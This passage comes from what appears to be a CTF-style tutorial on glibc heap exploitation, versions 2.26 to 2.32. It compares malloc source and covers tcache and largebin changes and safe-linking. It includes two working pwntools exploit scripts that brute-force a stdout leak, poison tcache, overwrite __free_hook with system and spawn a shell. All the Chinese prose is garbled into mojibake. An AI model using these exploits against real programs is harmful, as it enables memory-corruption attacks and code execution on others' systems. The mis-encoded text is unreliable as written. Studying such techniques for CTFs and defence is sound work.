(tcache->counts[tc_idx] < mp_.tcache_count\n                       && (tc_victim = last (bin)) != bin)\n                {\n                    if (tc_victim != 0)\n                    {\n                        bck = tc_victim->bk;\n                        set_inuse_bit_at_offset (tc_victim, nb);\n                        if (av != &main_arena)\n                            set_non_main_arena (tc_victim);\n                        bin->bk = bck;\n                        bck->fd = bin;\n\n                        tcache_put (tc_victim, tc_idx);\n                    }\n                }\n            }\n\n            #endif\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n        }\n    }\n}\n\n\n//2.32\nif (in_smallbin_range (nb))\n{\n    idx = smallbin_index (nb);\n    bin = bin_at (av, idx);\n\n    if ((victim = last (bin)) != bin)\n    {\n        if (victim == 0) /* initialization check */\n            malloc_consolidate (av);\n        else\n        {\n            bck = victim->bk;\n            if (__glibc_unlikely (bck->fd != victim))\n            {\n                errstr = \"malloc(): smallbin double linked list corrupted\";\n                goto errout;\n            }\n            set_inuse_bit_at_offset (victim, nb);\n            bin->bk = bck;\n            bck->fd = bin;\n\n            if (av != &main_arena)\n                set_non_main_arena (victim);\n            check_malloced_chunk (av, victim, nb);\n            #if USE_TCACHE\n            /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n            size_t tc_idx = csize2tidx (nb);\n            if (tcache && tc_idx < mp_.tcache_bins)\n            {\n                mchunkptr tc_victim;\n\n                /* While bin not empty and tcache not full, copy chunks over.  */\n                while (tcache->counts[tc_idx] < mp_.tcache_count\n                       && (tc_victim = last (bin)) != bin)\n                {\n                    if (tc_victim != 0)\n                    {\n                        bck = tc_victim->bk;\n                        set_inuse_bit_at_offset (tc_victim, nb);\n                        if (av != &main_arena)\n                            set_non_main_arena (tc_victim);\n                        bin->bk = bck;\n                        bck->fd = bin;\n\n                        tcache_put (tc_victim, tc_idx);\n                    }\n                }\n            }\n            #endif\n            void *p = chunk2mem (victim);\n            alloc_perturb (p, bytes);\n            return p;\n        }\n    }\n}\n\n```\n\nå¯ä»¥çœ‹åˆ°å‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œåªæœ‰ä¸€ä¸¤å¤„ï¼š\n\nA.2.26åˆ¤æ–­äº†smallbinæ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™ä¼šè°ƒç”¨**malloc_consolidate**è¿›è¡Œåˆå§‹åŒ–ï¼Œä½†æ˜¯ä»2.27å¼€å§‹å°±æ²¡æœ‰äº†ã€‚è¿™ä¸ªåœ¨é’ˆå¯¹**malloc_consolidate**è¿›è¡Œæ”»å‡»çš„æ—¶å€™å¯èƒ½ä¼šç”¨åˆ°ã€‚\n\nB.é”™è¯¯æ‰“å°æ–¹å¼ä¸åŒï¼š\n\n```c\n//2.26\nerrstr = \"malloc(): smallbin double linked list corrupted\";\ngoto errout;\n\n//errout define 2 time\nerrout:\n    if (!have_lock && locked)\n        __libc_lock_unlock (av->mutex);\n    malloc_printerr (check_action, errstr, chunk2mem (p), av);\n    return;\n}\n\nerrout:\n    malloc_printerr (check_action, errstr, chunk2mem (oldp), av);\n    return NULL;\n}\n\n//2.27åŠä»¥ä¸Š\nmalloc_printerr (\"malloc(): smallbin double linked list corrupted\");\n```\n\nè¿™ä¸ªåœ¨é’ˆå¯¹**malloc_printerr**ä¹Ÿå¯èƒ½ä¼šç”¨åˆ°\n\nè€Œè¿™ç§æ”»å‡»ä¸»è¦æ˜¯é’ˆå¯¹smallbinæ”»å‡»çš„ã€‚\n\nä½†ä¹Ÿæœ‰ä¸€ç§é’ˆå¯¹fastbinæ”»å‡»çš„ï¼š\n\n[Tcache Stashing Unlink Attackåˆ©ç”¨æ€è·¯ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/198173)\n\nè¿™ä¸ªåé¢å†è®¨è®ºä¸‹ã€‚\n\n## 2.UAFå¸¸è§é™åˆ¶\n\n### (1)UAF + Leak + Sizeä¸åšé™åˆ¶ï¼š\n\nè¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥æ³„éœ²åœ°å€ä¹‹åä»»æ„ç”³è¯·å°±å®Œäº†ã€‚\n\n### (2)UAF+Leak+Sizeåšé™åˆ¶:\n\nç»“åˆä¹‹å‰çš„ï¼Œå°Chunkå°±ä¿®æ”¹sizeï¼Œå¯ä»¥æ”¾å…¥unsortedbinå°±å¡«æ»¡Tcacheä¹‹åæ”¾å…¥æ³„éœ²åœ°å€åä»»æ„ç”³è¯·å³å¯ã€‚\n\n### (3)UAF+æ— Leak+Sizeä¸åšé™åˆ¶:\n\nä¸€èˆ¬å¾ˆå¤štcacheçš„é¢˜éƒ½ä¼šå¯¹sizeåšé™åˆ¶ï¼Œä½†æ˜¯å…¶å®å¯¹äºtcacheçš„UAFæ¥è¯´ï¼Œæ²¡å•¥å¤§ç”¨ï¼Œéƒ½èƒ½ç»•è¿‡ï¼Œåƒæˆ‘ä¸‹é¢å¯¹äº0x4f8çš„chunkå°±å¯ä»¥åˆ©ç”¨ä¿®æ”¹sizeæ¥ä¼ªé€ ï¼Œå’Œä¹‹å‰åŸºæœ¬ä¸€è‡´ã€‚\n\nç”±äºtcacheæ²¡ä»€ä¹ˆé™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨unsortedbinè¸©ä¸‹åœ°å€åï¼Œå¯¹åº”ä¿®æ”¹fdå³å¯å®ç°çˆ†ç ´ç”³è¯·_IO_2_1_stdoutç»“æ„ä½“ï¼Œä¿®æ”¹flagå’Œéƒ¨åˆ†å­—èŠ‚å†™write_base,write_endæ¥æ³„éœ²åœ°å€ï¼Œç„¶åå°±å¯ä»¥ä»»æ„ç”³è¯·äº†ã€‚\n\n```python\ndef pwn():\n\tglobal p\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\tadd_malloc(0x1000-0x8-0x250,'PIG007NB')\n\n\n\tguess_libc = 0xf000\n\tguess_heap = 0xf000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tlg(\"guess_IO\",guess_IO)\n\t\n\tadd_malloc(0x4f8,\"\\x00\"*0x4f8)\t\t\t\t#idx\t0x1\n\t\n\tadd_malloc(0x38,\"\\x01\"*0x38)\t\t\t\t#idx\t0x2\n\tadd_malloc(0x38,\"\\x02\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x4\n\tadd_malloc(0x38,'\\x04'*0x38)\t\t\t\t#idx\t0x5\n\n\n\t#write libc addr\n\tfree(0x1)\n\tadd_malloc(0x78,p16((guess_IO)&0xffff))\t\t\t\t#idx \t0x6\n\t#show(0x1)\n\t#libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])\n\t#lg(\"libc_base_attempt\",libc_base_attempt)\n\t\n\tfree(0x2)\n\tfree(0x4)\n\tedit(0x4,0x2,p16((guess_heap+0x1000+0x10)&0xffff))\n\n\n\tadd_malloc(0x38,'\\x05'*0x38)\t\t\t\t\t\t#idx\t0x7\n\tadd_malloc(0x38,'\\x06'*0x38)\t\t\t\t\t\t#idx\t0x8\n\tadd_malloc(0x38,p64(0xfbad1800) + p64(0)*3 + '\\x00')#idx\t0x9\n\t\n\tlibc_base = u64Leakbase(0x3b5890)\n\tlg(\"libc_base\",libc_base)\n\n\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xa\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xb\n\tfree(0xa)\n\tfree(0xb)\n\tedit(0xb,0x8,p64(libc_base+libc.sym['__free_hook']))\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0xc\n\tadd_malloc(0x48,p64(libc_base + libc.sym['system']))#idx \t0xd\n\tfree(0xc)\n\tit()\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\nå½“ç„¶è¿™ç§è§£æ³•æœ‰ç‚¹æ²¡æ•ˆç‡ï¼Œå› ä¸ºéœ€è¦åŒæ—¶çˆ†ç ´Libcå’Œheapçš„å„åŠä¸ªå­—èŠ‚ï¼Œæ€»å…±ä¸€ä¸ªå­—èŠ‚ï¼Œæ€»çš„æ¥è¯´æ•°å­¦æœŸæœ›ä¸º1/256ã€‚ä½†æ˜¯è§‚å¯Ÿä¸Šé¢æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”±äºtcacheæœºåˆ¶ï¼ŒåŒå¤„äº0x100ä¸€ä¸ªå†…å­˜é¡µä¸‹çš„Chunkå‰é¢çš„éƒ½ä¸€æ ·ï¼Œä¸ç”¨çˆ†ç ´ï¼Œé‚£ä¹ˆåªéœ€è¦ä¿®æ”¹æœ€åä¸€ä¸ªå­—èŠ‚å³å¯å®Œæˆtcacheé“¾è¡¨çš„ä¿®æ”¹ï¼Œè¿™æ ·çˆ†ç ´çš„æœŸæœ›å°±ä¸‹é™åˆ°äº†åŠä¸ªå­—èŠ‚ï¼Œæ•°å­¦æœŸæœ›1/16ï¼Œæ˜æ˜¾æå‡äº†å¾ˆå¤§æ•ˆç‡ï¼Œæ¯”èµ›æ—¶ç›´å†²ä¸€è¡€ï¼Œå˜¿å˜¿ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\ndef pwn():\n\tglobal p\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\tadd_malloc(0x1000-0x8-0x250,'PIG007NB')\n\n\n\tguess_libc = 0xd000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tlg(\"guess_IO\",guess_IO)\n\t\n\ttcacheMalloc(0x98) \t\t#idx 0x1~0x7\n\tadd_malloc(0x98,\"\\x00\"*0x98)\t\t\t\t#idx\t0x8\n\t\n\tadd_malloc(0x98,\"\\x00\"*0x98)\t\t\t\t#idx\t0x9\n\n\n\tadd_malloc(0x38,\"\\x01\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x02\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0xc\n\tadd_malloc(0x38,'\\x04'*0x38)\t\t\t\t#idx\t0xd\n\n\n\t#write libc addr\n\ttcacheDelete(0x1)\n\tfree(0x9)\n\tadd_malloc(0x38,p16((guess_IO)&0xffff))\t\t\t\t#idx \t0xe\n\t#show(0x1)\n\t#libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])\n\t#lg(\"libc_base_attempt\",libc_base_attempt)\n\t\n\t#change 0x40 link_list\n\tfree(0xa)\n\tfree(0xc)\n\tedit(0xc,0x1,'\\x10')\n\t\n\tadd_malloc(0x38,'\\x05'*0x38)\t\t\t\t\t\t#idx\t0xf\n\tadd_malloc(0x38,'\\x06'*0x38)\t\t\t\t\t\t#idx\t0x10\n\tadd_malloc(0x38,p64(0xfbad1800) + p64(0)*3 + '\\x00')#idx\t0x11\n\t\n\tlibc_base = u64Leakbase(0x3b5890)\n\tlg(\"libc_base\",libc_base)\n\n\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x12\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x13\n\tfree(0x12)\n\tfree(0x13)\n\tedit(0x13,0x8,p64(libc_base+libc.sym['__free_hook']))\n\t\n\tadd_malloc(0x48,'/bin/sh\\x00')\t\t\t\t\t\t#idx\t0x14\n\tadd_malloc(0x48,p64(libc_base + libc.sym['system']))#idx \t0x15\n\tfree(0x14)\n\tit()\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\nâ–²çˆ†ç ´é¢˜å¤–è¯ï¼šä¹‹å‰æ²¡æ€ä¹ˆå‘ç°ï¼Œè¿™é‡Œå‘ç°PIE+ASLRå‡ºæ¥çš„Libcåœ°å€å¼€å¤´å¯èƒ½æ˜¯0x7eï¼Œè€Œä¸”ä¸­é—´ä¹Ÿæœ‰å¯èƒ½ä¼šå‡ºç°\\x00çš„æƒ…å†µï¼Œè¿™æ ·å°±å¾ˆå®¹æ˜“ä½¿å¾—æˆ‘ä»¬çˆ†ç ´çš„æ¬¡æ•°ç›´çº¿ä¸Šæ¶¨ï¼Œæ‰€ä»¥åœ¨è°ƒè¯•å¥½äº†ä¹‹åï¼Œçˆ†ç ´ä¼šåŠ å…¥\n\n```python\n#æ³¨é‡Šå¤´\n\ncontext.timeout = 0.5\n#----------------------------------------------------------------------\nexcept Exception:\n    p.close()\n\tcontinue\n```\n\næ¥ç®€å•å¯¹æŠ—è¿™ä¸¤ç§å˜åŒ–ï¼Œé˜²æ­¢çˆ†ç ´ä¸­æ–­ã€‚\n\n### (4)UAF+æ— Leak+Sizeåšé™åˆ¶:\n\nä¸€èˆ¬å¾ˆå¤štcacheçš„é¢˜éƒ½ä¼šå¯¹sizeåšé™åˆ¶ï¼Œè¦ä¹ˆå°ï¼Œè¦ä¹ˆå¤§ã€‚ä½†æ˜¯å…¶å®å¯¹äºtcacheçš„UAFæ¥è¯´ï¼Œæ²¡å•¥å¤§ç”¨ï¼Œéƒ½èƒ½ç»•è¿‡ï¼Œä¸åƒfastbinä¸€æ ·ï¼Œéœ€è¦åœ¨ç›®çš„åœ°å€ä¼ªé€ sizeã€‚æ‰€ä»¥è¿™é‡ŒåŸºæœ¬ä¸Šä¿®æ”¹ä¸€ä¸‹sizeéƒ½å¯ä»¥å¾—åˆ°å¯¹åº”è§£æ³•ï¼Œè¿™ç§é¢˜ç›®æ›´å¤šåº”è¯¥æ˜¯è€ƒå¯Ÿå †å¸ƒå±€çš„èƒ½åŠ›ã€‚éœ€è¦æœ‰ä¸€ä¸ªå¯¹äºæ‰€æœ‰chunkè¿›è¡Œå¸ƒå±€çš„èƒ½åŠ›ï¼Œæœ€å¥½å‡†å¤‡è‰ç¨¿çº¸å†™å†™ç”»ç”»(excelä¹Ÿè¡Œ).....\n\n\n\n# å…­ã€Glibc2.31\n\n## 1.éƒ¨åˆ†æ‰‹æ®µå¤±æ•ˆ\n\n### (1)åŸå§‹largebin attackå¤±æ•ˆ\n\nä»2.30å¼€å§‹å°†ä»unsortebinæ”¾å…¥largebinçš„ä»£ç ä¸­åœ¨sizeæ¯”è¾ƒçš„å…¶ä¸­ä¸€ä¸ªåˆ†æ”¯æ–°å¢æ£€æŸ¥ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\n//unsortedbin chunk->size < largebin chunk->size\nif ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))\n{\n    fwd = bck;\n    bck = bck->bk;\n    victim->fd_nextsize = fwd->fd;\n    victim->bk_nextsize = fwd->fd->bk_nextsize;\n    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;\n}\nelse //unsortedbin chunk->size >= largebin chunk->size\n{\n    assert (chunk_main_arena (fwd));\n    while ((unsigned long) size < chunksize_nomask (fwd))\n    {\n        fwd = fwd->fd_nextsize;\n        assert (chunk_main_arena (fwd));\n    }\n\n    if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd))\n    /* Always insert in the second position.  */\n    \tfwd = fwd->fd;\n    else\n    {\n        victim->fd_nextsize = fwd;\n        victim->bk_nextsize = fwd->bk_nextsize;\n        if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n        \tmalloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n        fwd->bk_nextsize = victim;\n        victim->bk_nextsize->fd_nextsize = victim;\n    }\n    bck = fwd->bk;\n    if (bck->fd != fwd)\n    \tmalloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n}\n\n```\n\nå³å½“å‘ç”Ÿä»unsortedbinä¸­è½¬ç§»åˆ°largbinä¸­æ—¶ï¼Œå¦‚æœunsortedbinä¸­è¦è½¬ç§»çš„chunkçš„sizeå¤§äºlargebinä¸­åŸæœ¬å°±æœ‰çš„å°¾éƒ¨chunkçš„sizeï¼Œå°±ä¼šè§¦å‘æ–°å¢çš„æ£€æŸ¥ã€‚å¦åˆ™ï¼Œåˆ™ä¸ä¼šè§¦å‘æ–°å¢çš„æ£€æŸ¥ã€‚\n\nè€Œæ–°å¢æ£€æŸ¥çš„æ„æ€å…¶å®å°±æ˜¯æ£€æŸ¥åŒå‘é“¾è¡¨çš„å®Œæ•´æ€§ï¼Œè¿™å’Œä¹‹å‰unsortedbinå¤±æ•ˆåŠ å…¥çš„æ£€æŸ¥å¦‚å‡ºä¸€è¾™ã€‚\n\n```C\n//æ³¨é‡Šå¤´\n\nif (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n    malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n```\n\n```C\n//æ³¨é‡Šå¤´\n\nif (bck->fd != fwd)\n    malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n```\n\nä½†æ˜¯ç”±äºå½“sizeå°äºçš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥ï¼Œæ‰€ä»¥largebin attackè¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œåªè¦unsortedbinä¸­è¦æ”¾å…¥largebinä¸­çš„chunkçš„sizeå°äºlargebinä¸­chunkçš„sizeå³å¯ï¼Œä½†æ˜¯è¿™é‡Œçš„largebin attackå·²ç»è¢«é™çº§ï¼Œç›¸æ¯”ä¹‹å‰çš„ä¸¤ä¸ªåœ°å€ä»»æ„å†™ï¼Œé™åˆ¶åªèƒ½å†™ä¸€ä¸ªåœ°å€äº†ã€‚\n\n### (2)Tcacheç»“æ„æ‰©å¤§\n\nä¹‹å‰ç‰ˆæœ¬çš„tcacheä¸­countä¸€ç›´æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™å›ä»2.30å¼€å§‹å°±å˜æˆäº†ä¸¤ä¸ªå­—èŠ‚ï¼š\n\n```c\n//æ³¨é‡Šå¤´\n\n//2.29\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n\n//2.30\ntypedef struct tcache_perthread_struct\n{\n  uint16_t counts[TCACHE_MAX_BINS];\n  tcache_entry *entries[TCACHE_MAX_BINS];\n} tcache_perthread_struct;\n```\n\næ‰€ä»¥tcacheçš„ç»“æ„ä½“ä¹Ÿä»0x250æ‰©å¤§ä¸º0x290\n\n### (3)åˆ é™¤äº†ä¸€äº›assert\n\nåœ¨2.30ç‰ˆæœ¬åŠä¹‹åï¼Œåˆ é™¤äº†ä¸€äº›æœ‰å…³tcacheçš„assert\n\n```c\n//æ³¨é‡Šå¤´\n\n//2.29\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n\n//2.30\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n  e->key = tcache;\n\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\n\n//2.29\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n\n//2.30\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  e->key = NULL;\n  return (void *) e;\n}\n```\n\nä»¥å‰å°±æƒ³ç€æ˜¯ä¸æ˜¯èƒ½åƒæ§fastbinYæº¢å‡ºä¸€æ ·æ¥æ§tcacheæº¢å‡ºå‘¢ï¼Œä½†åœ¨2.29åŠä»¥å‰è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºæœ‰assertå­˜åœ¨ã€‚å°±ç®—ä¿®æ”¹äº†mp_.tcache_binsï¼ŒæˆåŠŸè¿›å…¥tcache_putä¹Ÿä¼šå› ä¸ºassert(tc_idx<TCACHE_MAX_BINS)çš„æ–­è¨€ä½¿å¾—ç¨‹åºé€€å‡ºã€‚\n\n```c\n//æ³¨é‡Šå¤´\n\nif (tcache && tc_idx < mp_.tcache_bins)\n{\n    mchunkptr tc_victim;\n    /* While bin not empty and tcache not full, copy chunks.  */\n    while (tcache->counts[tc_idx] < mp_.tcache_count\n           && (tc_victim = *fb) != NULL)\n    {\n        if (SINGLE_THREAD_P)\n            *fb = tc_victim->fd;\n        else\n        {\n            REMOVE_FB (fb, pp, tc_victim);\n            if (__glibc_unlikely (tc_victim == NULL))\n                break;\n        }\n        tcache_put (tc_victim, tc_idx);\n    }\n}\n\nif (tc_idx < mp_.tcache_bins\n      && tcache\n      && tcache->counts[tc_idx] > 0)\n{\n    return tcache_get (tc_idx);\n}\n```\n\nä½†æ˜¯æ–°ç‰ˆæœ¬åˆ å»äº†è¿™ä¸ªæ“ä½œï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹mp_.tcache_binsï¼Œå°±å°†èƒ½å¤Ÿè°ƒç”¨tcache_putå‡½æ•°ï¼Œå°†tcacheç»“æ„ä½“å¾€åæº¢å‡ºï¼Œå°±åƒä¿®æ”¹global_max_fastä¸€æ ·ï¼Œå®åœ¨æ˜¯æœ‰ç‚¹é€—ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæ–°ç‰ˆæœ¬è¦åˆ æ‰ï¼Œè¿™ä¸ªå°±å¼•å…¥äº†ä¸€ç§æ–°çš„æ–¹æ³•ï¼š[glibc 2.27-2.32ç‰ˆæœ¬ä¸‹Tcache Structçš„æº¢å‡ºåˆ©ç”¨ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/235821)ã€‚è¿™ä¸ªæˆ‘ä¸ªäººè¿˜æ˜¯è§‰å¾—è¿™ä½å¸ˆå‚…è®²çš„è¿˜æ˜¯æœ‰ç‚¹å‡ºå…¥ï¼Œå› ä¸ºæ˜¯2.30æ‰åˆ å»çš„ï¼Œ2.29åŠä»¥å‰æ˜¯ä¸å­˜åœ¨è¿™ç§æ–¹æ³•çš„ï¼ŒåŒ…æ‹¬ç”¨2.29è°ƒè¯•ä¹Ÿæ˜¯çš„ã€‚\n\n### (4)å¯¹countæ–°å¢äº†ä¸€äº›é™åˆ¶\n\n```C\n//2.29\nif (tc_idx < mp_.tcache_bins\n    /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */\n    && tcache\n    && tcache->entries[tc_idx] != NULL)\n{\n    return tcache_get (tc_idx);\n}\n\n//2.30\nif (tc_idx < mp_.tcache_bins\n    && tcache\n    && tcache->counts[tc_idx] > 0)\n{\n    return tcache_get (tc_idx);\n}\n```\n\nä»2.30å¼€å§‹åœ¨`_libc_malloc`ä¸­å‡†å¤‡ä»tcacheä¸­ç”³è¯·æ—¶ï¼Œä¼šåˆ¤æ–­`counts[tc_idx]`æ˜¯å¦å¤§äº0ï¼Œä¸å¤§äº0åˆ™ä¸ä¼šä»tcacheä¸­ç”³è¯·ã€‚æ‰€ä»¥æœ‰æ—¶å€™æˆ‘ä»¬ä½¿ç”¨ç›´æ¥ä¿®æ”¹fdçš„åŠæ³•éœ€è¦è€ƒè™‘åˆ°æ•°é‡æ˜¯å¦ä¼šè¢«æ¸…0ã€‚ä½†æ˜¯åœ¨`_int_free`ä¸­å´æ²¡æœ‰æ–°å¢ç±»ä¼¼çš„æ£€æŸ¥ã€‚\n\n\n\n## 2.UAFå¸¸è§é™åˆ¶\n\n### (1)UAF+Leak+Sizeä¸åšé™åˆ¶:\n\nè¿™é‡Œä¹Ÿä¸éœ€è¦å¤šè®²ï¼Œæ”¾å…¥unsortedbinåç›´æ¥æ³„éœ²åœ°å€ä¹‹åä»»æ„ç”³è¯·å°±å®Œäº†ã€‚\n\n### (2)UAF+Leak+Sizeåšé™åˆ¶:\n\nç»“åˆä¹‹å‰çš„ï¼Œå°Chunkå°±ä¿®æ”¹sizeï¼Œå¯ä»¥æ”¾å…¥unsortedbinçš„å°±å¡«æ»¡Tcacheä¹‹åæ”¾å…¥æ³„éœ²åœ°å€åä»»æ„ç”³è¯·å³å¯ã€‚\n\n### (3)UAF+æ— Leak+Sizeä¸åšé™åˆ¶:\n\nå…¶å®å’Œ2.29å·®ä¸å¤šï¼Œåªæ˜¯å¤±æ•ˆäº†ä¸€äº›æ‰‹æ®µï¼Œæ¯”å¦‚ä¼ ç»Ÿçš„largebin attackå¤±æ•ˆã€‚è€Œä¹‹å‰åœ¨2.29ä¸­è®²åˆ°çš„ç›¸å…³æ–¹æ³•å…¶å®ä¹Ÿä¸€æ ·å¯ä»¥ç›´æ¥ç”¨ä¸Šã€‚çˆ†ç ´_IO_2_1_stdoutæ³„éœ²åœ°å€ï¼Œä¹‹åä»»æ„ç”³è¯·ä¿®æ”¹__free_hookå³å¯ã€‚\n\n### (4)UAF+æ— Leak+Sizeåšé™åˆ¶:\n\nåŒæ ·è¿˜æ˜¯éœ€è¦é€šè¿‡å †å¸ƒå±€æ¥ä¿®æ”¹sizeï¼Œåˆ¶é€ unsortedbin chunkã€‚\n\n# ä¸ƒã€Glibc2.32\n\n## 1.æ–°å¢æœºåˆ¶\n\n### (1)Tcacheå’ŒFastbinæ–°å¢æŒ‡é’ˆå¼‚æˆ–æ£€æŸ¥çš„safe-linkingæœºåˆ¶\n\n#### â‘ å¼•å…¥ä¸€ä¸ªå®å®šä¹‰\n\n```c\n#define PROTECT_PTR(pos, ptr) \\\n  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n```\n\nå³å°†ä¼ å…¥çš„poså³ç§»12bitåå’Œptrå¼‚æˆ–ã€‚\n\n#### â‘¡å®é™…åº”ç”¨\n\n##### Tcacheä¸­\n\n```c\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n    /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n     detect a double free.  */\n    e->key = tcache;\n\n    e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);\n    tcache->entries[tc_idx] = e;\n    ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    if (__glibc_unlikely (!aligned_OK (e)))\n        malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n    tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n\n```\n\n##### Fastbinä¸­\n\n```c\nif (SINGLE_THREAD_P)\n{\n    /* Check that the top of the bin is not the record we are going to\n   add (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n        malloc_printerr (\"double free or corruption (fasttop)\");\n    p->fd = PROTECT_PTR (&p->fd, old);\n    *fb = p;\n}\nelse\n    do\n    {\n        /* Check that the top of the bin is not the record we are going to\n     add (i.e., double free).  */\n        if (__builtin_expect (old == p, 0))\n            malloc_printerr (\"double free or corruption (fasttop)\");\n        old2 = old;\n        p->fd = PROTECT_PTR (&p->fd, old);\n    }\nwhile ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))\n       != old2);\n```\n\nå†åŠ ä¸Šå…¶ä»–\n\n```c\np->fd = PROTECT_PTR (&p->fd, old);\n//----------------------------------------\np = REVEAL_PTR (p->fd);\n//----------------------------------------\ntcache_tmp->entries[i] = REVEAL_PTR (e->next);\n//----------------------------------------\n*fb = REVEAL_PTR (victim->fd);\n//----------------------------------------\n*fb = REVEAL_PTR (tc_victim->fd);\n//----------------------------------------\ntmp = REVEAL_PTR (tmp->next))\n//----------------------------------------\nnextp = REVEAL_PTR (p->fd);\n```\n\n```c\n#define REMOVE_FB(fb, victim, pp)\t\t\t\\\ndo\t\t\t\t\t\t\t\\\n{\t\t\t\t\t\t\t\\\n\tvictim = pp;\t\t\t\t\t\\\n\tif (victim == 